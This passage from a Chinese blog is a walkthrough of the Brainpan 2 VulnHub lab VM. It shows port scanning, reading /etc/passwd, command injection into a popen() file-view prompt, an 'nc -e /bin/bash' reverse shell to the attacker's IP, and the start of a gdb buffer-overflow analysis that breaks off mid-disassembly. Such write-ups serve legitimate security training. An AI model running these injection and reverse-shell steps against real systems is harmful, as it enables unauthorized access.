<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub198.jpg"></p>
<h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul>
<li>缓冲区溢出</li>
<li>od调试程序</li>
<li>python模糊测试脚本测试段错误</li>
<li>msf脚本生成填充缓冲区的字节</li>
<li>msfvenom生成reverse shell的python shellcode版本的代码</li>
<li>覆盖eip将恶意shellcode代码放入esp取得reverseshell</li>
<li>man内置功能内联运行命令提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan2]</title>
    <url>/2020/02/01/brainpan2/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：brainpan：2<br>发行日期：2013年11月20日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjIuemlw">https://download.vulnhub.com/brainpan/brainpan2.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjIuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/brainpan/brainpan2.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">_               _                           ___  </span><br><span class="line">| |             (_)                         |__ \ </span><br><span class="line">| |__  _ __ __ _ _ _ __  _ __   __ _ _ __      ) |</span><br><span class="line">| <span class="string">&#x27;_ \| &#x27;</span>__/ _` | | <span class="string">&#x27;_ \| &#x27;</span>_ \ / _` | <span class="string">&#x27;_ \    / / </span></span><br><span class="line"><span class="string">| |_) | | | (_| | | | | | |_) | (_| | | | |  / /_ </span></span><br><span class="line"><span class="string">|_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_| |____|</span></span><br><span class="line"><span class="string">                        | |                       </span></span><br><span class="line"><span class="string">                        |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            by superkojiman  </span></span><br><span class="line"><span class="string">                 http://www.techorganic.com</span></span><br></pre></td></tr></table></figure>

<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>使用此虚拟机，即表示您同意，对任何损失或损害不承担任何责任，包括但不限于间接或间接损失或损害，或由于或来自于此而产生的数据或利润损失而造成的任何损失或损害。与使用此软件的连接。<br>TL; DR：如果发生坏事，这不是我的错。</p>
<h2 id="设定"><a href="#设定" class="headerlink" title="设定"></a>设定</h2><p>Brainpan已通过测试，可在以下虚拟机管理程序上运行：</p>
<ul>
<li>VMware Player 6.0.1</li>
<li>VMWare Fusion 6.0.2</li>
<li>VirtualBox 4.3.2</li>
</ul>
<p>检查以确保brainpan2.ova具有以下校验和，以便您知道下载的文件是否完整：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5：bf01f03ea0e7cea2553f74189ff35161SHA1：b46891cda684246832f4dbc80ec6e40a997af65a</span><br></pre></td></tr></table></figure>
<p>将brainpan2.ova导入到您首选的管理程序中，并根据需要配置网络设置。<br>它会通过DHCP获得IP地址，建议在NAT内运行它，或者仅对主机OS可见，因为它容易受到攻击。<br>VulnHub独家.<br><a href="http%EF%BC%9A//blog.vulnhub.com/2013/11/competition-brainpan-2.html">博客文章</a></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.116</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:6D:B8:70 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -v -sV -Pn -p- 192.168.56.116</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -v -sV -p 9999,10000 -A -T5 192.168.56.116</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|     _| _|</span><br><span class="line">|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|</span><br><span class="line">|     _|_| _| _| _| _| _| _| _| _| _| _| _|</span><br><span class="line">|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|</span><br><span class="line">|     [______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">|_    LOGIN AS GUEST</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.3</span><br><span class="line">|_http-title: Hacking Trends</span><br></pre></td></tr></table></figure>

<p>nc连接后然后根据具体提示输入命令，发现如下的信息，并能对文件进行一定的操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; GUEST</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; TELL ME MORE</span><br><span class="line">    FILES    HELP    VIEW       CREATE</span><br><span class="line">    USERS    MSG     SYSTEM     BYE</span><br><span class="line"></span><br><span class="line">                          &gt;&gt; FILES</span><br><span class="line">total 36</span><br><span class="line">-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe</span><br><span class="line">-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt</span><br><span class="line">-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt</span><br><span class="line">-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 <span class="built_in">test</span>-1</span><br><span class="line">-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 <span class="built_in">test</span>-2</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt</span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: /etc/passwd</span><br><span class="line">root:x:104:106:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">root :x:0:0:root:/var/root:/bin/bash</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:103::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">anansi:x:1000:1000:anansi,,,:/home/anansi:/bin/bash</span><br><span class="line">puck:x:1001:1001:puck,,,:/home/puck:/bin/bash</span><br><span class="line">reynard:x:1002:1002:reynard,,,:/home/reynard:/bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>太好了:)可以查看系统内部可以访问的任何文件。从文件列表中，发现uid是系统用户之一。尝试成功创建和读取其主目录中的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                          &gt;&gt; CREATE</span><br><span class="line">    ENTER FILE TO CREATE: /home/anansi/lucifer11   </span><br><span class="line">    ENTER CONTENTS: content\lucifer11testcontents</span><br><span class="line">    FILE CREATED</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: /home/anansi/lucifer11</span><br><span class="line">content\lucifer11testcontents</span><br></pre></td></tr></table></figure>

<p>这意味着可以读取用户获得许可的每个文件，并在可写目录中创建文件。检查了其他命令，但几乎所有命令尚未实现。guest用户不可用的很少。在那一刻，想起了HELP中的一句话引起了我的注意。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AUTHENTICATION</span><br><span class="line">       There is currently no proper authentication mechanism <span class="keyword">in</span> place. At this</span><br><span class="line">       time  the software is <span class="keyword">in</span> it<span class="string">&#x27;s alpha stage. The only avaiable account is</span></span><br><span class="line"><span class="string">       GUEST. The DEBUG account will alter the output of some commands -  use\u2010</span></span><br><span class="line"><span class="string">       ful for developers.</span></span><br></pre></td></tr></table></figure>

<p>提到DEBUG用户。我已从应用程序注销并再次提供“DEBUG”而不是“GUEST”帐户的连接。使用此帐户，可以运行“SYSTEM”命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; DEBUG</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; SYSTEM</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HOME=/home/anansi</span><br><span class="line">COLORTERM=(null)</span><br><span class="line">PWD=/opt/brainpan</span><br><span class="line">PATH=/bin:.:/usr/bin:/sbin</span><br><span class="line">SHLVL=1</span><br></pre></td></tr></table></figure>

<p>在这里停止一下，总结一下已经了解的有关目标的知识：</p>
<ul>
<li>它以单个IP：192.168.57.1​​0运行（在我的情况下）</li>
<li>它有两个开放端口9999和10000</li>
<li>在端口10000上正在运行http服务器（此处无趣）</li>
<li>该http服务器基于Python，这意味着Python已安装并且可以使用</li>
<li>在端口9999上运行某些自定义文件传输</li>
<li>应用自定义应用程序不仅可以在应用程序根目录中提供读取/写入系统中文件的功能</li>
<li>该应用程序在/opt/brainpan中</li>
<li>对DEBUG用户的访问不受限制，因此可以完全访问该应用</li>
<li>从notes.txt中知道应用程序正在使用popen（）查看文件等。</li>
</ul>
<p>可以轻松地将任何文件上传到目标，但无法执行。下一步将是在目标系统上查找远程代码执行。目标是在端口9999上运行的自定义应用程序。在这种情况下，创建程序伪代码是一个好主意。看一下：从popen手册中发现了这一点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">The <span class="built_in">command</span> argument is a pointer to a null-terminated string containing a shell <span class="built_in">command</span> line. This <span class="built_in">command</span> is passed to /bin/sh using the -c flag; interpretation, <span class="keyword">if</span> any, is performed by the shell.</span><br></pre></td></tr></table></figure>

<p>命令参数是指向以空结束的字符串的指针，该字符串包含shell命令行。使用-c标志将该命令传递给/bin/sh；解释（如果有）由shell执行。</p>
<p>意味着可以使用popen（）执行多个命令，唯一需要的就是将命令注入其中。在popen（）中可能使用用户输入的唯一两个命令是VIEW和CREATE。从VIEW开始：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                          &gt;&gt; VIEW  </span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt; <span class="built_in">echo</span> <span class="string">&quot;some unexpected text lucifer11&quot;</span>;           </span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">some unexpected text lucifer11</span><br><span class="line"></span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt; ifconfig;</span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 08:00:27:6d:b8:70  </span><br><span class="line">          inet addr:192.168.56.116  Bcast:192.168.56.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::a00:27ff:fe6d:b870/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:213 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:152 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:20390 (19.9 KiB)  TX bytes:19237 (18.7 KiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></table></figure>

<p>可以从输出看到;后面的命令已经被成功执行</p>
<p>创建远程shell程序并执行（是的，也可以使用一些Metasploit payload创建文件并运行它）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                      &gt;&gt; VIEW</span><br><span class="line">ENTER FILE TO DOWNLOAD: fuck; nc -e /bin/bash 192.168.56.102 6666</span><br></pre></td></tr></table></figure>

<p>监听6666端口，成功的返回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">192.168.56.116: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53756</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">anansi@brainpan2:/opt/brainpan$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)</span><br><span class="line">anansi@brainpan2:/opt/brainpan$ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br><span class="line">anansi@brainpan2:/opt/brainpan$</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ ls  </span><br><span class="line">ls</span><br><span class="line">msg_root  readme.txt  startweb.sh  web</span><br><span class="line">anansi@brainpan2:/home/reynard$ ./msg_root</span><br><span class="line">./msg_root</span><br><span class="line">usage: msg_root username message</span><br></pre></td></tr></table></figure>

<p>anansi文件夹中没什么有趣的，可以访问reynard文件夹并找到一个有趣的应用程序。已经在文件夹中启动了SimpleHTTPServer并下载这个二进制文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ python -m SimpleHTTPServer</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET /robots.txt HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:04] <span class="string">&quot;GET /msg_root HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>使用gdb逆向一下看看，可以看到输入垃圾数据出现了段错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ gdb msg_root</span><br><span class="line">gdb msg_root</span><br><span class="line">GNU gdb (GDB) 7.4.1-debian</span><br><span class="line">Copyright (C) 2012 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;i486-linux-gnu&quot;</span>.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;...</span><br><span class="line">Reading symbols from /home/reynard/msg_root...done.</span><br><span class="line"></span><br><span class="line">(gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">&lt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                      </span><br><span class="line">Starting program: /home/reynard/msg_root aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616161 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) BT</span><br><span class="line">BT</span><br><span class="line"><span class="comment">#0  0x61616161 in ?? ()</span></span><br><span class="line"><span class="comment">#1  0x0804872e in get_name (u=0xbffffe70 &#x27;a&#x27; &lt;repeats 108 times&gt;, </span></span><br><span class="line">    m=0xbffffedd <span class="string">&#x27;a&#x27;</span> &lt;repeats 87 <span class="built_in">times</span>&gt;) at msg_root.c:26</span><br><span class="line"><span class="comment">#2  0x0804877b in main (argc=3, argv=0xbffffd54) at msg_root.c:35</span></span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>已经在hte中检查了文件，并在其中找到了一些函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">save_msg</span><br><span class="line">get_name</span><br><span class="line">main</span><br></pre></td></tr></table></figure>

<p>执行应用程序后，将转到：main -&gt; get_name -&gt; save_msg。从崩溃中查看回溯，注意到方法get_name内的地址0x0804872e。分解此函数将得到如下代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble get_name</span><br><span class="line">disassemble get_name</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> get_name:</span><br><span class="line">   0x080486a1 &lt;+0&gt;:     push   %ebp</span><br><span class="line">   0x080486a2 &lt;+1&gt;:     mov    %esp,%ebp</span><br><span class="line">   0x080486a4 &lt;+3&gt;:     sub    <span class="variable">$0x20</span>,%esp</span><br><span class="line">   0x080486a7 &lt;+6&gt;:     movl   <span class="variable">$0x804863c</span>,-0x4(%ebp)</span><br><span class="line">   0x080486ae &lt;+13&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486b1 &lt;+16&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486b4 &lt;+19&gt;:    call   0x8048500 &lt;strlen@plt&gt;</span><br><span class="line">   0x080486b9 &lt;+24&gt;:    cmp    <span class="variable">$0x11</span>,%eax</span><br><span class="line">   0x080486bc &lt;+27&gt;:    ja     0x80486d2 &lt;get_name+49&gt;</span><br><span class="line">   0x080486be &lt;+29&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486c1 &lt;+32&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x080486c5 &lt;+36&gt;:    lea    -0x12(%ebp),%eax</span><br><span class="line">   0x080486c8 &lt;+39&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486cb &lt;+42&gt;:    call   0x80484b0 &lt;strcpy@plt&gt;</span><br><span class="line">   0x080486d0 &lt;+47&gt;:    jmp    0x80486ec &lt;get_name+75&gt;</span><br><span class="line">   0x080486d2 &lt;+49&gt;:    movl   <span class="variable">$0x12</span>,0x8(%esp)</span><br><span class="line">   0x080486da &lt;+57&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486dd &lt;+60&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x080486e1 &lt;+64&gt;:    lea    -0x12(%ebp),%eax</span><br><span class="line">   0x080486e4 &lt;+67&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486e7 &lt;+70&gt;:    call   0x8048540 &lt;strncpy@plt&gt;</span><br><span class="line">   0x080486ec &lt;+75&gt;:    movl   <span class="variable">$0x7d0</span>,(%esp)</span><br><span class="line">   0x080486f3 &lt;+82&gt;:    call   0x80484c0 &lt;malloc@plt&gt;</span><br><span class="line">   0x080486f8 &lt;+87&gt;:    mov    %eax,-0x8(%ebp)</span><br><span class="line">   0x080486fb &lt;+90&gt;:    mov    0xc(%ebp),%eax</span><br><span class="line">   0x080486fe &lt;+93&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x08048701 &lt;+96&gt;:    call   0x8048500 &lt;strlen@plt&gt;</span><br><span class="line">   0x08048706 &lt;+101&gt;:   mov    %eax,0x8(%esp)</span><br><span class="line">   0x0804870a &lt;+105&gt;:   mov    0xc(%ebp),%eax</span><br><span class="line">   0x0804870d &lt;+108&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048711 &lt;+112&gt;:   